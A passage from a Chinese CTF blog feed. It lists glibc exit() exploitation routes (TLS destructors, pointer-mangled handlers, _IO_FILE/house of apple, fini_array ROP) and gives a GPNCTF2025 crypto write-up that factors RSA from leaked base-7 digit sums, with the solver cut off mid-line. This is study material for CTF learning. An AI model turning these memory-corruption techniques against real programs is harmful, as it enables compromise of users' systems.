class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! (fp-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">        &amp;&amp; (legacy || fp-&gt;_mode != <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">            <span class="type">int</span> cnt;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXTRIES 2</span></span><br><span class="line">  <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; MAXTRIES; ++cnt)</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_lock == <span class="literal">NULL</span> || _IO_lock_trylock (*fp-&gt;_lock) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      __sched_yield ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (! legacy &amp;&amp; ! dealloc_buffers &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">            &#123;</span><br><span class="line">                fp-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line"></span><br><span class="line">                fp-&gt;_freeres_list = freeres_list;</span><br><span class="line">                freeres_list = fp;</span><br><span class="line">                fp-&gt;_freeres_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            _IO_SETBUF (fp, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (! legacy &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">            _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">            <span class="keyword">if</span> (cnt &lt; MAXTRIES &amp;&amp; fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">            _IO_lock_unlock (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (! legacy)</span><br><span class="line">fp-&gt;_mode = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">    _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exit函数调试">exit函数调试</h2><h1 id="exit函数执行流程开始时">exit函数执行流程(开始时)</h1><ul><li>exit函数在开始的时候并没有执行，而是进行动态链接，将<code>exit()</code>函数的地址绑定到起来。但是这一绑定的过程其实是比较容易利用的。</li></ul><h1 id="总结">总结</h1><ul><li><p>对于<code>exit</code>函数的利用其实就是好几个：</p><ul><li>利用<code>__call_tls_dtors</code>这个TLS析构函数，该函数会触发一个函数指针。</li><li>利用注册函数，但是这个函数通常会被<code>fs:0x30</code>加密，如果想要修改注册函数，就必须先泄露<code>fs:0x30</code>或者先修改<code>fs:0x30</code>。</li><li><code>IO</code>函数刷新缓冲区，这个其实就是<code>_IO_FILE</code>的利用，<code>house of apple</code>就与这个相关了，进行这个利用其实是最经常用的了。</li><li>劫持<code>rtdl_fini()</code>中的函数指针，劫持<code>l_info伪造fini_array节</code>，使用<code>fini_array</code>进行ROP，以及<code>劫持fini</code></li></ul></li><li><p>为了加深对<code>exit()</code>函数的执行过程，其实对应<code>IO</code>利用的<code>exit()</code>函数这里暂时不拿例题。只拿<code>exit()</code>函数其他两个利用的例题。</p></li></ul><h1 id="题目1">题目1——</h1>]]></content>
    
    
    <summary type="html">前言：暑假看exit函数流程不太明白，最近牢的一题对exit有比较清晰了。</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>GPNCTF2025复现</title>
    <link href="http://iyheart.github.io/2025/09/05/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GPNCTF2025%E5%A4%8D%E7%8E%B0/"/>
    <id>http://iyheart.github.io/2025/09/05/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GPNCTF2025%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-09-05T14:35:04.000Z</published>
    <updated>2025-09-05T15:55:26.932Z</updated>
    
    <content type="html"><![CDATA[<h1 id="碎碎念">碎碎念</h1><p><strong>对于写WP个人的见解</strong>：</p><p>对于一些比赛，虽然有写wp，但是其实本人是想着一个方向或者多个方向复现完再发的，但是这比较困难，因为每个比赛的每个方向题目都是有简单、有困难的。简单的题目还好，可能一下子就复现完了，但是剩下的比较困难的题目就很难受了可能会因为知识储备不足而无法自己独立做出。虽然说是有wp可以看，但是看wp的目的是能学到东西，而不是利用脚本一把梭一下。</p><p>所以在复现比赛题目的时候往往对自己要求比较高，而遇到难的短时间复现不了，时间一长好像就把题目鸽了<code>(老毛病了)QAQ</code>。这就导致我写的wp感觉还是比较少的。并且一些比赛题目是用AI一把梭的（AI一把梭的根本学不到东西），对于这种情况我是更希望复现完了再发wp的。</p><p><strong>对于CTF中使用AI的一些碎碎念</strong>：</p><p>高中物理老师说过，考试是考试，考试要有考试的技巧；平时刷题就要踏踏实实的刷题；考试过后对于试卷的题目也是需要踏踏实实的。</p><p>而CTF比赛其实某种程度上也相当于考试吧，而大部分CTF比赛都允许使用AI的，这就导致在比赛中使用AI就相当于一个考试的技巧，黑猫白猫抓到老鼠的都是好猫——能解出题目的AI就是好AI（哈哈哈哈）。这就导致了大部分人遇到题目就会直接把题目附件之类的直接丢给AI一把梭（包括我自己）。</p><p>所以这个暑假就期间就已经开始反思了，就觉得AI一把梭是真学不到东西，赛后也是一鸽再鸽，所以干脆在平时的CTF比赛中减少AI一把梭的次数，并且拿到题目附件的时候并不是第一时间丢给AI，而是认认真真的看懂代码，对于代码中不明白的部分再去询问AI（这样总比直接复制粘贴丢给AI能学到东西），只有实在没思路的题目还是需要AI一把梭的（毕竟CTF是个竞赛，还是个团队协作的比赛，都能用AI一把梭的但是你不会，也只能先使用AI一把梭把flag梭出来再说了）。</p><h1 id="crypto">Crypto</h1><h2 id="hinting">hinting</h2><ul><li>题目附件如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">b&quot;There was an actual flag here once&quot;</span></span><br><span class="line">FLAG = sys.argv[<span class="number">1</span>].encode() <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> FLAG</span><br><span class="line">BS = <span class="number">1024</span></span><br><span class="line">FLAG = bytes_to_long(FLAG)</span><br><span class="line">set_random_seed(secrets.randbelow(<span class="built_in">int</span>(<span class="number">2</span>**<span class="number">64</span>)))</span><br><span class="line">p, q = random_prime(<span class="number">2</span> ** (BS), <span class="number">2</span> ** (BS - <span class="number">1</span>)), random_prime(<span class="number">2</span>**BS, <span class="number">2</span> ** (BS - <span class="number">1</span>))</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(FLAG, e, n) <span class="comment"># RSA加密</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n:x&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e:x&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;<span class="built_in">int</span>(c):x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">pp, qq = (</span><br><span class="line">    p.digits(base=<span class="number">7</span>, padto=<span class="built_in">int</span>(log(<span class="number">2</span> ** (BS + <span class="number">1</span>), <span class="number">7</span>)) + <span class="number">2</span>), </span><br><span class="line">    q.digits(base=<span class="number">7</span>, padto=<span class="built_in">int</span>(log(<span class="number">2</span> ** (BS + <span class="number">1</span>), <span class="number">7</span>)) + <span class="number">2</span>),</span><br><span class="line">) <span class="comment">#pp,qq分别为p、q的7进制位,小索引号对应的是低位</span></span><br><span class="line">V = vector([(pp[i] + qq[i]) % <span class="number">7</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pp))]) <span class="comment"># 相同位相加然后模7</span></span><br><span class="line"><span class="built_in">print</span>(V)<span class="comment"># 输出结果</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 2666fab0a6dae7095642f0cb67602776badc8ede2629a54866017fc3840394f8157f0cc38e9f02b48733f1dbae4514d3d808d9a824b2933170e153dfcfedb0148f8a89311575df58c2c12ee11fae2510073956221ec472ae3f1bbd685011c350955502a2b0b1160e1fa299a050c0ee89c161c0fa55e32fb3806f2970287702f7d566e155fac71a4202c8b15d27c0dac2a566ad955d0ef7df73af86dc4e8f7e0048ccdb6ea551477c99bd6545b7dda2886c86796f20cbba8f2ddd173e2ab93bb00e5993c8adac5921d8586553b7a6086f7ff8c43f571d251bf5931ebb858bd64366cd92efa2fa7d9c4ea6a91049696454066046ef6dd4e6d9516439bcbadc266b</span></span><br><span class="line"><span class="string">e = 10001</span></span><br><span class="line"><span class="string">c = 230e6605e4a59cda037ec9d08830137e93bcec65af7ca9d93c17fccc45b7e7908909134e9f6410ab9b76b53c2402455e6b7cc0b1e7ee2c0921b2ebc5c6407b323fef3b905197ef4224886d2ba0b98b277f2cf267fbefae9e2067e2c8a4be0915b2665d53c1cf725b4f50ff4e7b66743656f36bee57b93fa07bd3d5fcaf7b596d48e876b26499b436c703581d10d85de024a803710f188733766c3be06dd6eeb7a0acff37a4656cb9d4c0053a96b2c61480b6da6792095d47d3a7e7e0beb00acba38d5f430228e54f691dce6e63a936500acede51afbba16ea8b0b7042373787667dfc5694d4ed048a9127565ca2050986997cd312a54616d63611d56ab4dbbf0</span></span><br><span class="line"><span class="string">(1, 0, 3, 4, 1, 1, 1, 1, 5, 6, 0, 1, 3, 2, 0, 5, 6, 2, 4, 6, 0, 6, 4, 2, 3, 1, 6, 5, 1, 6, 0, 2, 2, 2, 2, 6, 0, 5, 6, 2, 5, 0, 6, 5, 2, 5, 5, 0, 0, 2, 3, 2, 5, 2, 0, 4, 2, 2, 1, 0, 6, 2, 3, 5, 3, 6, 5, 5, 3, 6, 1, 4, 4, 2, 2, 6, 6, 3, 5, 6, 3, 6, 6, 5, 6, 1, 1, 6, 5, 4, 4, 2, 1, 3, 0, 5, 4, 4, 0, 6, 3, 2, 1, 0, 1, 2, 0, 6, 3, 5, 4, 2, 2, 1, 5, 3, 0, 1, 3, 5, 2, 2, 3, 6, 5, 5, 2, 0, 6, 0, 6, 1, 0, 2, 2, 4, 0, 3, 1, 4, 1, 4, 6, 5, 4, 6, 3, 3, 1, 3, 0, 3, 4, 5, 0, 0, 0, 4, 1, 6, 5, 3, 0, 0, 1, 4, 3, 4, 0, 3, 4, 1, 6, 3, 6, 0, 0, 3, 6, 2, 2, 3, 4, 4, 1, 5, 4, 5, 1, 5, 3, 2, 0, 0, 1, 4, 3, 0, 4, 2, 1, 3, 0, 2, 6, 1, 5, 6, 3, 4, 1, 3, 2, 5, 3, 5, 5, 5, 1, 5, 2, 2, 1, 2, 6, 6, 3, 1, 2, 5, 6, 5, 2, 3, 4, 2, 3, 4, 2, 6, 6, 0, 6, 1, 5, 3, 1, 4, 5, 0, 4, 3, 1, 0, 1, 1, 1, 0, 4, 6, 0, 4, 2, 0, 0, 2, 0, 4, 3, 2, 3, 0, 4, 5, 6, 2, 4, 6, 6, 0, 0, 4, 1, 1, 3, 3, 6, 1, 6, 2, 4, 4, 3, 5, 3, 2, 4, 3, 4, 1, 4, 1, 6, 6, 1, 0, 4, 2, 3, 6, 3, 5, 4, 2, 6, 2, 2, 1, 6, 2, 1, 2, 4, 4, 0, 0, 4, 5, 2, 3, 1, 4, 1, 1, 5, 6, 0, 0, 5, 0, 4, 6, 1, 5, 2, 0, 0, 4, 6, 2, 3, 3, 2, 2, 5, 2, 0, 1, 2, 1, 0, 5, 6, 2, 3, 0, 0)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>这题其实也是类似于<code>p异或q</code>的题型，都是通过剪枝搜索，但是应该如何搜索，应该从多项式乘法入手。目前已知<code>p</code>、<code>q</code>的七进制位，将它们俩个用多项式表示如下：</li></ul><p>$$<br>p = a_n<em>7^{n} + a_{n-1}<em>7^{n-1} + …+a_{1}<em>7^{1}+a_0</em>7^{0}<br>\q = b_n</em>7^{n} + b_{n-1}<em>7^{n-1} + …+b_{1}<em>7^{1}+b_0</em>7^{0}<br>\p</em>q=a_0</em>q+a_1*7^{1}<em>q+…+a_n</em>7^{n}*q<br>$$</p><ul><li>这时展开来可以发现：</li></ul><p>$$<br>p<em>q=a_0</em>b_0+a_0b_1<em>7^1+a_1b_0</em>7^{1}+…<br>$$</p><ul><li>此时我们可以发现，由<code>a_0*b_0</code>其实就可以确定n的最低<code>1</code>位，而已知<code>a_0、b_0、a_1、b_1</code>就可以已知最低的<code>2</code>位,以此类推知道多少位就能已知多少位一直到最高位。这其实就类似于<code>p^q</code>的低位搜索，只不过将二进制换成了七进制。所以正常<code>DFS</code>剪枝搜索即可。(猜想：可能可以从高位和低位进行中间相遇)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = <span class="number">0x2666fab0a6dae7095642f0cb67602776badc8ede2629a54866017fc3840394f8157f0cc38e9f02b48733f1dbae4514d3d808d9a824b2933170e153dfcfedb0148f8a89311575df58c2c12ee11fae2510073956221ec472ae3f1bbd685011c350955502a2b0b1160e1fa299a050c0ee89c161c0fa55e32fb3806f2970287702f7d566e155fac71a4202c8b15d27c0dac2a566ad955d0ef7df73af86dc4e8f7e0048ccdb6ea551477c99bd6545b7dda2886c86796f20cbba8f2ddd173e2ab93bb00e5993c8adac5921d8586553b7a6086f7ff8c43f571d251bf5931ebb858bd64366cd92efa2fa7d9c4ea6a91049696454066046ef6dd4e6d9516439bcbadc266b</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="number">0x230e6605e4a59cda037ec9d08830137e93bcec65af7ca9d93c17fccc45b7e7908909134e9f6410ab9b76b53c2402455e6b7cc0b1e7ee2c0921b2ebc5c6407b323fef3b905197ef4224886d2ba0b98b277f2cf267fbefae9e2067e2c8a4be0915b2665d53c1cf725b4f50ff4e7b66743656f36bee57b93fa07bd3d5fcaf7b596d48e876b26499b436c703581d10d85de024a803710f188733766c3be06dd6eeb7a0acff37a4656cb9d4c0053a96b2c61480b6da6792095d47d3a7e7e0beb00acba38d5f430228e54f691dce6e63a936500acede51afbba16ea8b0b7042373787667dfc5694d4ed048a9127565ca2050986997cd312a54616d63611d56ab4dbbf0</span></span><br><span class="line">hint = (<span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">x0 = &#123;<span class="number">0</span>:<span class="number">0</span>,<span class="number">1</span>:<span class="number">6</span>,<span class="number">2</span>:<span class="number">5</span>,<span class="number">3</span>:<span class="number">4</span>,<span class="number">4</span>:<span class="number">3</span>,<span class="number">5</span>:<span class="number">2</span>,<span class="number">6</span>:<span class="number">1</span>&#125;</span><br><span class="line">x1 = &#123;<span class="number">0</span>:<span class="number">1</span>,<span class="number">1</span>:<span class="number">0</span>,<span class="number">2</span>:<span class="number">6</span>,<span class="number">3</span>:<span class="number">5</span>,<span class="number">4</span>:<span class="number">4</span>,<span class="number">5</span>:<span class="number">3</span>,<span class="number">6</span>:<span class="number">2</span>&#125;</span><br><span class="line">x2 = &#123;<span class="number">0</span>:<span class="number">2</span>,<span class="number">1</span>:<span class="number">1</span>,<span class="number">2</span>:<span class="number">0</span>,<span class="number">3</span>:<span class="number">6</span>,<span class="number">4</span>:<span class="number">5</span>,<span class="number">5</span>:<span class="number">4</span>,<span class="number">6</span>:<span class="number">3</span>&#125;</span><br><span class="line">x3 = &#123;<span class="number">0</span>:<span class="number">3</span>,<span class="number">1</span>:<span class="number">2</span>,<span class="number">2</span>:<span class="number">1</span>,<span class="number">3</span>:<span class="number">0</span>,<span class="number">4</span>:<span class="number">6</span>,<span class="number">5</span>:<span class="number">5</span>,<span class="number">6</span>:<span class="number">4</span>&#125;</span><br><span class="line">x4 = &#123;<span class="number">0</span>:<span class="number">4</span>,<span class="number">1</span>:<span class="number">3</span>,<span class="number">2</span>:<span class="number">2</span>,<span class="number">3</span>:<span class="number">1</span>,<span class="number">4</span>:<span class="number">0</span>,<span class="number">5</span>:<span class="number">6</span>,<span class="number">6</span>:<span class="number">5</span>&#125;</span><br><span class="line">x5 = &#123;<span class="number">0</span>:<span class="number">5</span>,<span class="number">1</span>:<span class="number">4</span>,<span class="number">2</span>:<span class="number">3</span>,<span class="number">3</span>:<span class="number">2</span>,<span class="number">4</span>:<span class="number">1</span>,<span class="number">5</span>:<span class="number">0</span>,<span class="number">6</span>:<span class="number">6</span>&#125;</span><br><span class="line">x6 = &#123;<span class="number">0</span>:<span class="number">6</span>,<span class="number">1</span>:<span class="number">5</span>,<span class="number">2</span>:<span class="number">4</span>,<span class="number">3</span>:<span class="number">3</span>,<span class="number">4</span>:<span class="number">2</span>,<span class="number">5</span>:<span class="number">1</span>,<span class="number">6</span>:<span class="number">0</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(x0))</span><br><span class="line">search = &#123;<span class="number">0</span>:x0,<span class="number">1</span>:x1,<span class="number">2</span>:x2,<span class="number">3</span>:x3,<span class="number">4</span>:x4,<span class="number">5</span>:x5,<span class="number">6</span>:x6&#125;</span><br><span class="line">n_list = n.digits(base=<span class="number">7</span>)</span><br><span class="line"><span class="built_in">print</span>(n_list)</span><br><span class="line">candidate = []</span><br><span class="line"><span class="comment"># 1*7^0 + 0*7^1 + ... + </span></span><br><span class="line"><span class="comment">#print(bit)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">p,q</span>):</span><br><span class="line">    l = <span class="built_in">len</span>(p)</span><br><span class="line">    <span class="keyword">if</span> l &lt; <span class="built_in">len</span>(hint):</span><br><span class="line">        count = hint[l]</span><br><span class="line">    p_ = <span class="built_in">int</span>(p,<span class="number">7</span>)</span><br><span class="line">    q_ = <span class="built_in">int</span>(q,<span class="number">7</span>)</span><br><span 